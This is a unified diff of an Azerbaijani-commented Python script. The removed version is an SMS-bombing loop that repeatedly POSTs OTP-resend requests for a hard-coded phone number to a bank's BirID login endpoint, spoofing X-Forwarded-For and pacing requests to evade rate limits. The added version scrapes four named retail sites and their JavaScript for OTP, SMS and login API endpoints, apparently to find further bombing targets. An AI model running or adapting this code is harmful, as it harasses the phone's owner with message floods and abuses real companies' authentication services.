@@ -1,52 +1,90 @@
 import urllib.request
-import json
-import random
-import time
+import re
 import ssl
+import time
 
-# --- SƏLAHİYYƏTLİ HƏDƏF ---
-TARGET_PHONE = "508880067" 
+# --- ANALİZ EDİLƏCƏK HƏDƏF SAYT ---
+# Bura yoxlamaq istədiyin saytın nömrə yazılan səhifəsini yaz
+TARGETS = [
+    "https://umico.az",
+    "https://kontakt.az/hesabim/",
+    "https://bakuelectronics.az",
+    "https://alipasha.az"
+]
 
-def strike():
-    print(f"[!!!] BirID API SNIPER AKTİVDİR: 994{TARGET_PHONE}")
+def sniff_api(url):
+    print(f"\n[!] KƏŞFİYYAT BAŞLADI: {url}")
     
+    # SSL və Header ayarlari
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"}
 
-    # Şəkildəki məlumatlar əsasında qurulmuş real API ünvanı
-    url = "https://bird.kapitalbank.az/auth/realms/bird/login-actions/authenticate"
-    
-    # Bu parametrlər sizin şəkildəki seansınıza uyğunlaşdırılmışdır
-    params = "client_id=umico&tab_id=ey5TL8FdROE"
-    full_url = f"{url}?{params}"
+    try:
+        # 1. Ana səhifəni oxu
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
+            html = resp.read().decode('utf-8', errors='ignore')
 
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Referer": "https://bird.kapitalbank.az/",
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    }
+        # 2. JS fayllarını tap
+        js_files = re.findall(r'src="([^"]+\.js)"', html)
+        
+        # 3. API yolları üçün dərindən axtarış regexləri
+        patterns = [
+            r'(/api/v[0-9]/[a-zA-Z0-9\._\-/]+)',
+            r'(/wp-json/[a-zA-Z0-9\._\-/]+)',
+            r'([a-zA-Z0-9\._\-/]+-api/[a-zA-Z0-9\._\-/]+)',
+            r'(/[a-zA-Z0-9\._\-/]*/sms/[a-zA-Z0-9\._\-/]*)',
+            r'(/[a-zA-Z0-9\._\-/]*/otp/[a-zA-Z0-9\._\-/]*)'
+        ]
 
-    # BirID üçün lazım olan real POST payload formatı
-    payload = f"phoneNumber={TARGET_PHONE}&resend=true&login="
-    data = payload.encode('utf-8')
+        found_endpoints = set()
 
-    while True:
-        try:
-            req = urllib.request.Request(full_url, data=data, headers=headers, method='POST')
-            
-            with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
-                status = resp.getcode()
-                print(f"[HIT] BirID-Umico siqnalı uğurlu! Status: {status}")
-            
-            # Rate Limit-ə düşməmək və sönməmək üçün 2 saniyəlik fasilə
-            time.sleep(2)
+        # HTML içində axtar
+        for p in patterns:
+            for m in re.findall(p, html):
+                found_endpoints.add(m)
 
-        except Exception as e:
-            # Əgər status 403 və ya 404-dürsə, biz təkrar yoxlayırıq
-            print(f"[*] Bağlantı yoxlanılır... {e}")
-            time.sleep(5)
+        # JS fayllarının içində dərindən axtar (Əsas API-lər buradadır)
+        for js in js_files[:10]: # İlk 10 əsas JS faylı
+            if js.startswith('/'):
+                js = url.split('/')[0] + "//" + url.split('/')[2] + js
+            elif not js.startswith('http'):
+                continue
+                
+            try:
+                js_req = urllib.request.Request(js, headers=headers)
+                with urllib.request.urlopen(js_req, context=ctx, timeout=10) as js_resp:
+                    js_code = js_resp.read().decode('utf-8', errors='ignore')
+                    for p in patterns:
+                        for m in re.findall(p, js_code):
+                            found_endpoints.add(m)
+            except:
+                continue
+
+        # Nəticələri filtrələ və göstər
+        print("-" * 50)
+        print(f"RESULT FOR {url}:")
+        critical_found = False
+        for ep in sorted(found_endpoints):
+            low_ep = ep.lower()
+            if any(k in low_ep for k in ["otp", "sms", "login", "auth", "verify", "register"]):
+                print(f" >>> [KRİTİK API] {ep}")
+                critical_found = True
+            else:
+                # Çox uzun lazımsız linkləri gizlədirik
+                if len(ep) < 60:
+                    print(f" [Link] {ep}")
+        
+        if not critical_found:
+            print("[?] Bu səhifədə birbaşa OTP yolu tapılmadı.")
+        print("-" * 50)
+
+    except Exception as e:
+        print(f"[ERROR] {url} skan edilərkən xəta: {e}")
 
 if __name__ == "__main__":
-    strike()
+    for t in TARGETS:
+        sniff_api(t)
+        time.sleep(2)
